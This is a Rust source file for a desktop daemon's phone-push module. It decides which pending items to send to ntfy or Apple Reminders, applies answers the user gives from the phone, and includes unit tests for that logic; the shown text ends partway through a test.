//! Phone push, the daemon's half: every 30 seconds it looks for needs-you
//! items it has not seen, asks `neko_core::phone::decide` which deserve a
//! push, sends to ntfy and queues reminders for the installed app to create
//! (the app owns EventKit, this owns the decisions). Also answers the app's
//! Reminders report and the Settings page. See docs/knowledge/phone-push.md.
use crate::routines;
use crate::server::AppState;
use neko_core::phone::{self as core, Candidate, Env, Pending, Push};
use neko_core::Db;
use neko_protocol::phone::{PhoneSettings, RemindersAccess};
use neko_protocol::{Request, Response};
use serde_json::Value;
use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;

const TICK: Duration = Duration::from_secs(30);

pub fn spawn(state: Arc<AppState>) {
    std::thread::spawn(move || loop {
        std::thread::sleep(TICK);
        if let Err(error) = tick(&state) {
            eprintln!("phone: {error}");
        }
    });
}

fn lock(state: &AppState) -> std::sync::MutexGuard<'_, Db> {
    state.db.lock().unwrap_or_else(std::sync::PoisonError::into_inner)
}

/// Seconds since the last keyboard or mouse input, from `ioreg`.
fn hid_idle_secs() -> Option<u64> {
    let output = std::process::Command::new("/usr/sbin/ioreg").args(["-c", "IOHIDSystem", "-d", "4"]).output().ok()?;
    core::parse_hid_idle(&String::from_utf8_lossy(&output.stdout))
}

fn tick(state: &AppState) -> Result<(), String> {
    let (pushes, settings) = {
        let db = lock(state);
        plan(&db, neko_core::workbench::now_ms(), &hid_idle_secs, core::local_hour())?
    };
    if !pushes.is_empty() {
        let results = deliver(&settings, &pushes, &core::send_ntfy);
        record(&lock(state), &results, neko_core::workbench::now_ms())?;
    }
    crate::morning_digest::tick(state, &core::send_ntfy)
}

/// Looks at the items and decides what to send now; queues reminders and
/// saves the state. `idle` is asked only when something is waiting.
pub(crate) fn plan(db: &Db, now: i64, idle: &dyn Fn() -> Option<u64>, hour: u32) -> Result<(Vec<Push>, PhoneSettings), String> {
    let settings = core::load_settings(db);
    let mut state = core::load_state(db);
    let latest = neko_core::routines::latest_seq(db)?;
    // Nothing new, nothing waiting, nothing to keep in step: one small row.
    if state.cursor == Some(latest) && state.held.is_empty() && state.mapped.is_empty() && state.pending.is_empty() {
        return Ok((Vec::new(), settings));
    }
    let held_items = routines::all_items_with_routine(db)?;
    let items: Vec<neko_protocol::routines::NeedsYou> = held_items.iter().map(|(_, i)| i.clone()).collect();
    let newest = items.iter().map(|i| i.seq).max().unwrap_or(0).max(latest);
    let cursor = state.cursor.unwrap_or(newest);
    // Turning a channel on never pushes what was already there.
    let new: Vec<Candidate> = items
        .iter()
        .filter(|i| i.seq > cursor && !i.done)
        .map(|i| {
            let routine = held_items.iter().find(|(_, held)| held.seq == i.seq).map(|(r, _)| r.as_str()).unwrap_or("");
            let action = crate::inbox_reply::action_label(db, routine, i).unwrap_or_default();
            Candidate { seq: i.seq, title: i.title.clone(), detail: i.detail.clone(), link: i.link.clone(), urgent: i.urgent, since_ms: now, action }
        })
        .collect();
    state.cursor = Some(newest);
    let open: HashSet<u64> = items.iter().filter(|i| !i.done).map(|i| i.seq).collect();
    let waiting = !new.is_empty() || !state.held.is_empty();
    let env = Env { now_ms: now, idle_secs: if waiting && core::any_channel(&settings) { idle() } else { None }, local_hour: hour };
    let pushes = core::decide(&settings, &mut state, new, &open, &env);
    if settings.reminders {
        for push in pushes.iter() {
            state.pending.push(Pending { reminder: core::reminder_for(push), queued_ms: now, action: push.action.clone() });
        }
    }
    core::trim(&mut state);
    core::save_state(db, &state)?;
    Ok((pushes, settings))
}

/// Sends the pushes to ntfy. A failure stops the batch (a server that is
/// down is not hammered) and is returned once.
pub(crate) fn deliver(settings: &PhoneSettings, pushes: &[Push], send: &dyn Fn(&str, &Value) -> Result<(), String>) -> Vec<(&'static str, Result<(), String>)> {
    if !settings.ntfy {
        return Vec::new();
    }
    let mut results = Vec::new();
    for push in pushes {
        let result = send(&settings.ntfy_server, &core::ntfy_body(settings, push));
        let failed = result.is_err();
        results.push(("ntfy", result));
        if failed {
            break;
        }
    }
    results
}

pub(crate) fn record(db: &Db, results: &[(&'static str, Result<(), String>)], now: i64) -> Result<(), String> {
    let mut state = core::load_state(db);
    for (channel, result) in results {
        if core::note_outcome(&mut state, channel, result, now) {
            if let Err(error) = result {
                eprintln!("phone: {channel}: {error}");
            }
        }
    }
    core::save_state(db, &state)
}

fn view(db: &Db) -> Response {
    let settings = core::settings_with_topic(db);
    let status = core::status(&settings, &core::load_state(db));
    Response::Phone { settings, status }
}

/// The app's report, in full: what the person did on the phone is applied
/// first (`apply_replies`: completing applies the default, a `>` line is the
/// answer), then the plan says what to create, delete and finish.
pub(crate) fn respond(state: &AppState, now: i64, access: RemindersAccess, present: &[String], completed: &[String], notes: &[neko_protocol::phone::ReminderNote]) -> Result<neko_protocol::phone::ReminderPlan, String> {
    let jobs = jobs_for(&lock(state), access, completed, notes)?;
    for job in jobs {
        match job.what {
            What::DigestRead => crate::morning_digest::mark_read(&lock(state)),
            What::Seen => {}
            What::Apply(answer) => {
                let echo = matches!(answer, Answer::Text(_));
                let result = inbox_reply::apply(state, job.seq, answer.clone(), true);
                let db = lock(state);
                let mut phone = core::load_state(&db);
                match result {
                    Ok(done) if echo => {
                        if let (Answer::Text(text), Some(m)) = (&answer, phone.mapped.iter_mut().find(|m| m.id == job.id)) {
                            m.answered_ms = now;
                            let notes = format!("{}\n\nGot it: {text} ({})", job.notes.trim_end(), done.summary);
                            phone.finish.retain(|f| f.id != job.id);
                            phone.finish.push(neko_protocol::phone::ReminderFinish { id: job.id.clone(), notes, keep_open: false });
                        }
                        core::save_state(&db, &phone)?;
                    }
                    Ok(_) => {}
                    Err(error) => {
                        eprintln!("phone: could not apply the answer to item {}: {error}", job.seq);
                        // Say why in the reminder and leave it open, so the person can change their line.
                        if echo && !job.notes.is_empty() {
                            let notes = format!("{}\n\nNot applied: {error}", job.notes.trim_end());
                            phone.finish.retain(|f| f.id != job.id);
                            phone.finish.push(neko_protocol::phone::ReminderFinish { id: job.id.clone(), notes, keep_open: true });
                            core::save_state(&db, &phone)?;
                        }
                    }
                }
            }
        }
    }
    sync(&lock(state), now, access, present, completed)
}

/// What to do for one reminder the person touched.
enum What {
    Apply(Answer),
    /// Completed, and the item has no default: nothing is done but the reminder goes.
    Seen,
    DigestRead,
}

struct Job {
    id: String,
    seq: u64,
    what: What,
    /// The notes as the app last read them (the echo is added to these).
    notes: String,
}

use crate::inbox_reply::{self, Answer};

/// Looks at the reminders the person touched and decides what each means.
/// Only reminders Neko made count (they are in `mapped`), and only an item
/// that is still open. Reply text is judged once per distinct text.
fn jobs_for(db: &Db, access: RemindersAccess, completed: &[String], notes: &[neko_protocol::phone::ReminderNote]) -> Result<Vec<Job>, String> {
    let settings = core::load_settings(db);
    let mut phone = core::load_state(db);
    if access != RemindersAccess::Granted || (!settings.reminders && phone.mapped.is_empty()) {
        return Ok(Vec::new());
    }
    let done: HashSet<&String> = completed.iter().collect();
    let open: std::collections::HashMap<u64, (String, neko_protocol::routines::NeedsYou)> =
        routines::all_items_with_routine(db)?.into_iter().filter(|(_, i)| !i.done).map(|(r, i)| (i.seq, (r, i))).collect();
    let before = phone.clone();
    let mut jobs = Vec::new();
    for m in phone.mapped.iter_mut().filter(|m| m.answered_ms == 0 && m.seq != 0) {
        let completed_now = done.contains(&m.id);
        if core::is_digest(m.seq) {
            if completed_now && crate::morning_digest::current_seq(db) == Some(m.seq) {
                jobs.push(Job { id: m.id.clone(), seq: m.seq, what: What::DigestRead, notes: String::new() });
            }
            continue;
        }
        let Some((routine, item)) = open.get(&m.seq) else { continue };
        let reported = notes.iter().find(|n| n.id == m.id);
        if let Some(text) = reported.and_then(|n| neko_core::inbox::reply_in_notes(&n.notes)) {
            // The person wrote something: only that decides, once per distinct text.
            let hash = core::hash_text(&text);
            if hash != m.text_hash {
                m.text_hash = hash;
                if let Some(clean) = neko_core::inbox::answer_text(&text, item) {
                    jobs.push(Job { id: m.id.clone(), seq: m.seq, what: What::Apply(Answer::Text(clean)), notes: reported.map(|n| n.notes.clone()).unwrap_or_default() });
                }
            }
        } else if completed_now {
            // Completing applies the default the reminder promised, and only while the item still
            // offers exactly that (an agent may have refreshed it since): otherwise it is only seen.
            let now_label = inbox_reply::action_label(db, routine, item).unwrap_or_default();
            let what = if !now_label.is_empty() && now_label == m.action { What::Apply(Answer::Default) } else { What::Seen };
            jobs.push(Job { id: m.id.clone(), seq: m.seq, what, notes: String::new() });
        }
    }
    if phone != before {
        core::save_state(db, &phone)?;
    }
    Ok(jobs)
}

/// The plan half of the app's report: forgets what the person deleted and
/// says what to create, delete and finish. Closing items is `respond`'s work.
pub(crate) fn sync(db: &Db, now: i64, access: RemindersAccess, present: &[String], completed: &[String]) -> Result<neko_protocol::phone::ReminderPlan, String> {
    let settings = core::load_settings(db);
    let mut state = core::load_state(db);
    let before = state.clone();
    if !settings.reminders && state.mapped.is_empty() && state.pending.is_empty() {
        state.access = access;
        if state != before {
            core::save_state(db, &state)?;
        }
        return Ok(neko_protocol::phone::ReminderPlan::default());
    }
    core::absorb_sync(&mut state, access, present, completed);
    // The unread digest counts as open (a read or older one's reminder goes with it).
    let open: HashSet<u64> = if state.mapped.is_empty() { HashSet::new() } else { routines::all_items(db)?.iter().filter(|i| !i.done).map(|i| i.seq).chain(crate::morning_digest::current_seq(db)).collect() };
    let plan = core::plan(&settings, &mut state, &open, completed, now);
    if state != before {
        core::save_state(db, &state)?;
    }
    Ok(plan)
}

/// A test push on every channel that is on, whatever the hour or idle time.
fn test_push(state: &AppState, send: &dyn Fn(&str, &Value) -> Result<(), String>) -> Vec<String> {
    let push = Push { seq: 0, title: "Test from Neko".into(), detail: "If you can read this, Neko can reach you here.".into(), ..Default::default() };
    let (settings, access) = {
        let db = lock(state);
        (core::settings_with_topic(&db), core::load_state(&db).access)
    };
    let mut lines = Vec::new();
    if settings.reminders {
        if access == RemindersAccess::Granted {
            let db = lock(state);
            let mut phone = core::load_state(&db);
            phone.pending.push(Pending { reminder: core::reminder_for(&push), queued_ms: neko_core::workbench::now_ms(), action: String::new() });
            let _ = core::save_state(&db, &phone);
            lines.push("Reminders: queued, it appears within a minute".to_string());
        } else {
            lines.push("Reminders: allow access first".to_string());
        }
    }
    if settings.ntfy {
        let results = deliver(&settings, std::slice::from_ref(&push), send);
        let now = neko_core::workbench::now_ms();
        let _ = record(&lock(state), &results, now);
        lines.push(match results.first() {
            Some((_, Ok(()))) => "ntfy: sent".to_string(),
            Some((_, Err(error))) => format!("ntfy: {error}"),
            None => "ntfy: off".to_string(),
        });
    }
    if lines.is_empty() {
        lines.push("Turn on a channel first".to_string());
    }
    lines
}

pub fn handle(state: &AppState, request: Request) -> Response {
    handle_with(state, request, &core::send_ntfy)
}

fn handle_with(state: &AppState, request: Request, send: &dyn Fn(&str, &Value) -> Result<(), String>) -> Response {
    let now = neko_core::workbench::now_ms();
    let result = match request {
        Request::PhoneSettings => Ok(view(&lock(state))),
        Request::SetPhoneSettings { settings } => {
            let db = lock(state);
            core::save_settings(&db, settings).map(|_| view(&db))
        }
        Request::PhoneRemindersSync { access, present, completed, notes } => respond(state, now, access, &present, &completed, &notes).map(Response::PhonePlan),
        Request::PhoneRemindersDone { created, deleted, finished } => {
            let db = lock(state);
            let mut phone = core::load_state(&db);
            core::absorb_done(&mut phone, &created, &deleted, &finished, now);
            if created.iter().any(|c| !c.id.is_empty()) {
                core::note_outcome(&mut phone, "Reminders", &Ok(()), now);
            }
            core::save_state(&db, &phone).map(|()| view(&db))
        }
        Request::PhoneTest => Ok(Response::PhoneTest { lines: test_push(state, send) }),
        _ => Err("Not a phone request".to_string()),
    };
    result.unwrap_or_else(|message| Response::Error { message })
}

#[cfg(test)]
mod tests {
    use super::*;
    use neko_core::routines as rcore;
    use neko_protocol::routines::{NeedsYou, Routine, RoutineKind, RoutineRun};

    fn fixture() -> Db {
        let db = Db::open_in_memory().unwrap();
        let routine = Routine {
            id: "a".into(),
            workspace_id: "w".into(),
            kind: RoutineKind::Messages,
            name: "Messages".into(),
            instruction: String::new(),
            cadence: neko_protocol::routines::Cadence::Daily { hour: 9, minute: 0 },
            enabled: true,
            model: String::new(),
            paseo_schedule: None,
            browser: false,
            computer: false,
            customized: false,
            catch_up: None,
        };
        rcore::save_definitions(&db, &rcore::Store { routines: vec![routine], ..Default::default() }).unwrap();
        db
    }

    fn raise(db: &Db, title: &str, urgent: bool) -> u64 {
        let seq = rcore::reserve_seq(db, 1).unwrap();
        let item = NeedsYou { seq, title: title.into(), detail: "why".into(), urgent, created_ms: 1, touched_ms: 1, ..Default::default() };
        let mut runs = rcore::load_runs(db, "a").unwrap();
        runs.push(RoutineRun { id: format!("run{seq}"), routine_id: "a".into(), started_ms: 1, ok: true, needs_you: vec![item], ..Default::default() });
        rcore::save_runs(db, "a", &runs).unwrap();
        seq
    }

    fn away() -> Option<u64> {
        Some(9999)
    }

    fn turn_on(db: &Db, settings: PhoneSettings) {
        core::save_settings(db, settings).unwrap();
    }

    #[test]
    fn only_new_items_push_and_history_never_does() {
        let db = fixture();
        raise(&db, "Old one", false);
        turn_on(&db, PhoneSettings { ntfy: true, quiet_enabled: false, ..Default::default() });
        assert!(plan(&db, 10, &away, 12).unwrap().0.is_empty(), "first look only sets the cursor");
        let seq = raise(&db, "Reply to Sam", false);
        let (pushes, _) = plan(&db, 20, &away, 12).unwrap();
        assert_eq!(pushes.iter().map(|p| p.seq).collect::<Vec<_>>(), vec![seq]);
        assert!(plan(&db, 30, &away, 12).unwrap().0.is_empty(), "seen once, not again");
    }

    #[test]
    fn a_refresh_of_an_open_item_does_not_push_again() {
        let db = fixture();
        turn_on(&db, PhoneSettings { ntfy: true, quiet_enabled: false, ..Default::default() });
        plan(&db, 10, &away, 12).unwrap();
        raise(&db, "Reply to Sam", false);
        assert_eq!(plan(&db, 20, &away, 12).unwrap().0.len(), 1);
        // A refresh keeps the seq and changes the detail.
        let mut runs = rcore::load_runs(&db, "a").unwrap();
        runs[0].needs_you[0].detail = "newer".into();
        runs[0].needs_you[0].touched_ms = 99;
        rcore::save_runs(&db, "a", &runs).unwrap();
        assert!(plan(&db, 30, &away, 12).unwrap().0.is_empty());
    }

    #[test]
    fn at_the_mac_nothing_is_sent_and_quiet_hours_hold_non_urgent_items() {
        let db = fixture();
        turn_on(&db, PhoneSettings { ntfy: true, ..Default::default() });
        plan(&db, 10, &away, 12).unwrap();
        let calm = raise(&db, "Calm", false);
        let urgent = raise(&db, "Now", true);
        let (pushes, _) = plan(&db, 20, &away, 2).unwrap();
        assert_eq!(pushes.iter().map(|p| p.seq).collect::<Vec<_>>(), vec![urgent]);
        assert_eq!(core::load_state(&db).held.iter().map(|c| c.seq).collect::<Vec<_>>(), vec![calm]);
        let (pushes, _) = plan(&db, 30, &away, 8).unwrap();
        assert_eq!(pushes.iter().map(|p| p.seq).collect::<Vec<_>>(), vec![calm], "sent when quiet hours end");
        // At the Mac: dropped.
        raise(&db, "Third", false);
        assert!(plan(&db, 40, &|| Some(5), 12).unwrap().0.is_empty());
        assert!(core::load_state(&db).held.is_empty());
    }

    #[test]
    fn ntfy_failure_stops_the_batch_and_is_noted_once() {
        let settings = PhoneSettings { ntfy: true, ntfy_topic: "neko-abcdefghijklmnopqrstuvwx".into(), ..Default::default() };
        let pushes: Vec<Push> = (1..=3).map(|n| Push { seq: n, title: format!("T{n}"), ..Default::default() }).collect();
        let calls = std::cell::Cell::new(0);
        let fail = |_: &str, _: &Value| {
            calls.set(calls.get() + 1);
            Err::<(), String>("down".into())
        };
        let results = deliver(&settings, &pushes, &fail);
        assert_eq!((results.len(), calls.get()), (1, 1), "no retry loop");
        let db = Db::open_in_memory().unwrap();
        record(&db, &results, 5).unwrap();
        record(&db, &results, 6).unwrap();
        assert_eq!(core::load_state(&db).last_error.as_deref(), Some("down"));
        let ok = |_: &str, body: &Value| {
            assert_eq!(body["topic"], "neko-abcdefghijklmnopqrstuvwx");
            Ok(())
        };
        let results = deliver(&settings, &pushes, &ok);
        assert_eq!(results.len(), 3);
        record(&db, &results, 9).unwrap();
        let state = core::load_state(&db);
        assert_eq!((state.last_error, state.last_push_ms, state.last_channel.as_str()), (None, Some(9), "ntfy"));
        assert!(deliver(&PhoneSettings::default(), &pushes, &ok).is_empty(), "off means nothing is sent");
    }

    #[test]
    fn reminders_are_queued_created_completed_and_cleaned_up() {
        let db = fixture();
        turn_on(&db, PhoneSettings { reminders: true, quiet_enabled: false, ..Default::default() });
        plan(&db, 10, &away, 12).unwrap();
        let seq = raise(&db, "Reply to Sam", false);
        plan(&db, 20, &away, 12).unwrap();
        // No access yet: nothing to create, the setting alone is reported.
        let p = sync(&db, 21, RemindersAccess::NotAsked, &[], &[]).unwrap();
        assert!(p.enabled && p.create.is_empty());
        let p = sync(&db, 22, RemindersAccess::Granted, &[], &[]).unwrap();
        assert_eq!(p.create.len(), 1);
        assert!(p.create[0].notes.ends_with(&core::marker(seq)));
        let mut phone = core::load_state(&db);
        let key = phone.pending[0].reminder.key.clone();
        core::absorb_done(&mut phone, &[neko_protocol::phone::ReminderCreated { seq, id: "rem1".into(), key }], &[], &[], 23);
        core::save_state(&db, &phone).unwrap();
        assert!(sync(&db, 24, RemindersAccess::Granted, &["rem1".into()], &[]).unwrap().create.is_empty());
        // Completed on the phone: the reminder is removed (what completing means is `respond`'s work).
        let p = sync(&db, 25, RemindersAccess::Granted, &["rem1".into()], &["rem1".into()]).unwrap();
        assert_eq!(p.delete, vec!["rem1".to_string()]);
    }

    #[test]
    fn closing_an_item_in_neko_removes_its_reminder() {
        let db = fixture();
        turn_on(&db, PhoneSettings { reminders: true, quiet_enabled: false, ..Default::default() });
        plan(&db, 10, &away, 12).unwrap();
        let seq = raise(&db, "Reply to Sam", false);
        plan(&db, 20, &away, 12).unwrap();
        sync(&db, 21, RemindersAccess::Granted, &[], &[]).unwrap();
        let mut phone = core::load_state(&db);
        let key = phone.pending[0].reminder.key.clone();
        core::absorb_done(&mut phone, &[neko_protocol::phone::ReminderCreated { seq, id: "rem1".into(), key }], &[], &[], 22);
        core::save_state(&db, &phone).unwrap();
        routines::close_seqs(&db, &[seq], neko_core::inbox::BY_YOU).unwrap();
        let p = sync(&db, 30, RemindersAccess::Granted, &["rem1".into()], &[]).unwrap();
        assert_eq!(p.delete, vec!["rem1".to_string()]);
    }

    #[test]
    fn handlers_answer_settings_the_test_push_and_leave_old_rows_alone() {
        let state = crate::server::tests::test_state_for_phone();
        let Response::Phone { settings, status } = handle_with(&state, Request::PhoneSettings, &core::send_ntfy) else { panic!() };
        assert!(!settings.reminders && !settings.ntfy && settings.titles_only);
        assert!(status.subscribe_link.starts_with("ntfy://ntfy.sh/neko-"));
        let Response::PhoneTest { lines } = handle_with(&state, Request::PhoneTest, &core::send_ntfy) else { panic!() };
        assert_eq!(lines, vec!["Turn on a channel first".to_string()]);
        let on = PhoneSettings { ntfy: true, reminders: true, ntfy_topic: settings.ntfy_topic.clone(), ..settings };
        handle_with(&state, Request::SetPhoneSettings { settings: on }, &core::send_ntfy);
        let sent = std::cell::RefCell::new(Vec::new());
        let mock = |server: &str, body: &Value| {
            sent.borrow_mut().push((server.to_string(), body.clone()));
            Ok(())
        };
        let Response::PhoneTest { lines } = handle_with(&state, Request::PhoneTest, &mock) else { panic!() };
        assert_eq!(lines, vec!["Reminders: allow access first".to_string(), "ntfy: sent".to_string()]);
        assert_eq!(sent.borrow().len(), 1);
        assert_eq!(sent.borrow()[0].0, "https://ntfy.sh");
        let Response::Phone { status, .. } = handle_with(&state, Request::PhoneSettings, &core::send_ntfy) else { panic!() };
        assert!(status.last_push_ms.is_some() && status.last_channel == "ntfy");
        let bad = Request::SetPhoneSettings { settings: PhoneSettings { quiet_to_hour: 40, ..Default::default() } };
        assert!(matches!(handle_with(&state, bad, &core::send_ntfy), Response::Error { .. }));
    }

    // ---- replying from the phone: completing applies the default, a `>` line is the answer ----

    use neko_protocol::goals::{Blocked, Goal, GoalStatus};
    use neko_protocol::phone::{ReminderCreated, ReminderNote};

    /// A state whose database has the fixture routine; `reminders` on and Granted.
    fn reply_state() -> AppState {
        let state = crate::server::tests::test_state_for_phone();
        {
            let db = lock(&state);
            let routine = rcore::Store { routines: vec![fixture_routine()], ..Default::default() };
            rcore::save_definitions(&db, &routine).unwrap();
            core::save_settings(&db, PhoneSettings { reminders: true, quiet_enabled: false, ..Default::default() }).unwrap();
            let mut phone = core::load_state(&db);
            phone.access = RemindersAccess::Granted;
            phone.cursor = Some(0);
            core::save_state(&db, &phone).unwrap();
        }
        state
    }

    fn fixture_routine() -> Routine {
        let db = fixture();
        rcore::load(&db).unwrap().routines.remove(0)
    }

    /// Raises an item like a routine run would, with a default and a link.
    fn ask(state: &AppState, title: &str, default: Option<&str>, link: Option<&str>) -> u64 {
        let db = lock(state);
        let seq = rcore::reserve_seq(&db, 1).unwrap();
        let item = NeedsYou { seq, title: title.into(), detail: "why it is asked".into(), default: default.map(Into::into), link: link.map(Into::into), created_ms: 1, touched_ms: 1, ..Default::default() };
        let mut runs = rcore::load_runs(&db, "a").unwrap();
        runs.push(RoutineRun { id: format!("run{seq}"), routine_id: "a".into(), started_ms: 1, ok: true, needs_you: vec![item], ..Default::default() });
        rcore::save_runs(&db, "a", &runs).unwrap();
        seq
    }

    /// Pushes the item to the phone and pretends the app made its reminder `rem<seq>`.
    fn on_phone(state: &AppState, seq: u64) -> String {
        let db = lock(state);
        let mut phone = core::load_state(&db);
        phone.cursor = Some(0);
        core::save_state(&db, &phone).unwrap();
        let (pushes, _) = plan(&db, 50, &away, 12).unwrap();
        assert!(pushes.iter().any(|p| p.seq == seq), "the item is pushed");
        let mut phone = core::load_state(&db);
        let pending = phone.pending.iter().find(|p| p.reminder.seq == seq).unwrap().reminder.clone();
        let id = format!("rem{seq}");
        core::absorb_done(&mut phone, &[ReminderCreated { seq, id: id.clone(), key: pending.key }], &[], &[], 51);
        core::save_state(&db, &phone).unwrap();
        id
    }

    fn report(state: &AppState, present: &[&str], completed: &[&str], notes: &[(&str, &str)]) -> neko_protocol::phone::ReminderPlan {
        let notes: Vec<ReminderNote> = notes.iter().map(|(id, n)| ReminderNote { id: (*id).into(), notes: (*n).into() }).collect();
        let present: Vec<String> = present.iter().map(|s| (*s).to_string()).collect();
        let completed: Vec<String> = completed.iter().map(|s| (*s).to_string()).collect();
        respond(state, 100, RemindersAccess::Granted, &present, &completed, &notes).unwrap()
    }

    fn item(state: &AppState, seq: u64) -> NeedsYou {
        routines::all_items(&lock(state)).unwrap().into_iter().find(|i| i.seq == seq).unwrap()
    }

    fn goal_item(state: &AppState, goal: &mut Goal, blocked: bool) -> u64 {
        let db = lock(state);
        let link = format!("goal:{}", goal.id);
        let seq = if blocked {
            let b = goal.blocked.clone().unwrap();
            crate::routines::raise_goal_item(&db, "w", &b.question, "detail", &link, &b.default_answer).unwrap()
        } else {
            crate::routines::raise_goal_item(&db, "w", "Extend by 10 turns?", "detail", &link, "Extend by 10 turns").unwrap()
        };
        if blocked { goal.blocked.as_mut().unwrap().inbox_seq = Some(seq) } else { goal.extend_seq = Some(seq) }
        neko_core::goals::save(&db, goal).unwrap();
        seq
    }

    fn add_task(state: &AppState, id: &str) {
        let db = lock(state);
        let mut snapshot = neko_core::workbench::load(&db).unwrap();
        if snapshot.workspaces.is_empty() {
            snapshot.workspaces.push(neko_protocol::workbench::Workspace { id: "w".into(), name: "W".into(), repository: "/tmp/neko-test-repo".into(), instructions: String::new(), away_enabled: false });
        }
        snapshot.tasks.push(serde_json::from_value(serde_json::json!({"id": id, "workspace_id": "w", "title": "t", "goal": "g", "status": "Building", "plan": "", "result": "", "worktree": null, "created_at_ms": 0, "updated_at_ms": 0, "events": []})).unwrap());
        neko_core::workbench::save(&db, &snapshot).unwrap();
    }

    fn blocked_goal(state: &AppState) -> (Goal, u64) {
        let mut goal = Goal { id: "g1".into(), workspace_id: "w".into(), objective: "Keep the reports job green".into(), status: GoalStatus::Blocked, blocked: Some(Blocked { question: "Which database?".into(), default_answer: "the primary".into(), inbox_seq: None }), ..Default::default() };
        goal.budget.max_turns = 20;
        let seq = goal_item(state, &mut goal, true);
        (goal, seq)
    }

    fn goal(state: &AppState, id: &str) -> Goal {
        neko_core::goals::load(&lock(state), id).unwrap().unwrap()
    }

    #[test]
    fn the_reminder_title_says_what_completing_it_does() {
        let state = reply_state();
        let (mut paused, _) = (Goal { id: "g2".into(), workspace_id: "w".into(), objective: "Document the job".into(), ticket_id: Some("NK-14".into()), status: GoalStatus::Paused, ..Default::default() }, 0);
        paused.budget.max_turns = 20;
        let extend = goal_item(&state, &mut paused, false);
        let (_, blocked) = blocked_goal(&state);
        let plain = ask(&state, "Reply to Sam?", Some("Say yes"), None);
        let none = ask(&state, "Pick a colour?", None, None);
        let (pushes, _) = plan(&lock(&state), 50, &away, 12).unwrap();
        let title = |seq: u64| pushes.iter().find(|p| p.seq == seq).map(|p| core::reminder_for(p)).unwrap();
        assert_eq!(title(extend).title, "Extend by 10 turns? ✓ = extend NK-14 by 10 turns");
        assert_eq!(title(blocked).title, "Which database? ✓ = answer \"the primary\"");
        assert_eq!(title(plain).title, "Reply to Sam? ✓ = reply \"Say yes\"");
        assert_eq!(title(none).title, "Pick a colour?", "no default, no promise in the title");
        assert!(title(none).notes.contains("No default."), "{}", title(none).notes);
    }

    #[test]
    fn completing_applies_the_default_for_a_blocked_goal() {
        let state = reply_state();
        let (_, seq) = blocked_goal(&state);
        let id = on_phone(&state, seq);
        report(&state, &[&id], &[&id], &[]);
        let g = goal(&state, "g1");
        assert_eq!(g.status, GoalStatus::Running, "the goal runs again");
        assert!(g.reason.contains("the primary"), "{}", g.reason);
        assert!(item(&state, seq).done);
    }

    #[test]
    fn completing_applies_the_default_for_an_extend_offer() {
        let state = reply_state();
        let mut paused = Goal { id: "g2".into(), workspace_id: "w".into(), objective: "Document".into(), status: GoalStatus::Paused, ..Default::default() };
        paused.budget.max_turns = 20;
        let seq = goal_item(&state, &mut paused, false);
        let id = on_phone(&state, seq);
        report(&state, &[&id], &[&id], &[]);
        let g = goal(&state, "g2");
        assert_eq!((g.status, g.budget.max_turns), (GoalStatus::Running, 30), "extended by half the cap again");
    }

    #[test]
    fn completing_applies_the_default_for_the_spend_ceiling() {
        let state = reply_state();
        state.workbench.command(neko_protocol::workbench::Command::SetDailyBudget { cents: Some(1000) }).unwrap();
        let seq = {
            let db = lock(&state);
            let seq = crate::routines::raise_goal_item(&db, "w", "Raise the daily ceiling to $15?", "detail", "", "Raise the daily ceiling to $15").unwrap();
            neko_core::spend::save_notice(&db, &neko_core::spend::Notice { day_ms: 1, seq: Some(seq) }).unwrap();
            seq
        };
        let id = on_phone(&state, seq);
        report(&state, &[&id], &[&id], &[]);
        assert_eq!(neko_core::workbench::load(&lock(&state)).unwrap().daily_budget_cents, Some(1500));
        assert!(item(&state, seq).done);
    }

    #[test]
    fn completing_a_routine_item_with_a_default_records_it_and_one_without_only_marks_it_seen() {
        let state = reply_state();
        let with = ask(&state, "Reply to Sam?", Some("Say yes"), None);
        let without = ask(&state, "Pick a colour?", None, None);
        let (a, b) = (on_phone(&state, with), on_phone(&state, without));
        let p = report(&state, &[&a, &b], &[&a, &b], &[]);
        let done = item(&state, with);
        assert!(done.done && done.reason.as_deref() == Some("Answered on your phone"));
        let replies = crate::inbox_reply::replies(&lock(&state), "a", 100);
        assert_eq!((replies.len(), replies[0].title.as_str(), replies[0].answer.as_str()), (1, "Reply to Sam?", "Say yes"));
        assert!(!item(&state, without).done, "a question with no default stays open");
        assert!(p.delete.contains(&a) && p.delete.contains(&b), "both completed reminders go");
    }

    #[test]
    fn completing_an_item_that_names_a_task_queues_the_default_for_that_task() {
        let state = reply_state();
        let task_id = "t1";
        add_task(&state, task_id);
        let seq = ask(&state, "Use the staging key?", Some("Use the staging key"), Some("task:t1"));
        let id = on_phone(&state, seq);
        report(&state, &[&id], &[&id], &[]);
        let queued = neko_core::command_queue::of_task(&lock(&state), task_id).unwrap();
        assert_eq!(queued.len(), 1);
        assert_eq!((queued[0].mode, queued[0].kind), (neko_protocol::crew::DeliveryMode::AfterTurn, neko_protocol::crew::QueueKind::Answer));
        assert!(queued[0].text.contains("Use the staging key"), "{}", queued[0].text);
        assert!(item(&state, seq).done);
    }

    #[test]
    fn a_line_starting_with_greater_than_answers_a_blocked_goal() {
        let state = reply_state();
        let (_, seq) = blocked_goal(&state);
        let id = on_phone(&state, seq);
        let notes = format!("Which database?\n\n> the replica please\n\nneko:{seq}");
        let p = report(&state, &[&id], &[], &[(&id, &notes)]);
        let g = goal(&state, "g1");
        assert_eq!(g.status, GoalStatus::Running);
        assert!(g.reason.contains("the replica please") && !g.reason.contains("the primary"), "{}", g.reason);
        // The echo, then the reminder is completed and kept (not deleted).
        assert_eq!(p.finish.len(), 1);
        assert!(p.finish[0].notes.contains("Got it: the replica please"), "{}", p.finish[0].notes);
        assert!(p.finish[0].notes.contains("> the replica please"), "the person's own line stays");
        assert!(!p.delete.contains(&id));
        // The app reports it done; the echo is not repeated and the answer is not applied twice.
        let again = report(&state, &[&id], &[&id], &[(&id, &p.finish[0].notes)]);
        assert_eq!(again.finish.len(), 1, "still asked for until the app confirms");
        assert!(!again.delete.contains(&id), "kept so the echo can be read");
        let mut phone = core::load_state(&lock(&state));
        core::absorb_done(&mut phone, &[], &[], &[id.clone()], 101);
        assert!(phone.finish.is_empty());
        assert_eq!(goal(&state, "g1").status, GoalStatus::Running);
    }

    #[test]
    fn a_reply_to_an_inbox_item_reaches_the_routine_and_one_to_a_task_reaches_its_queue() {
        let state = reply_state();
        let plain = ask(&state, "Reply to Sam?", Some("Say yes"), None);
        let id = on_phone(&state, plain);
        let notes = format!("why\n> tell her Friday works\nneko:{plain}");
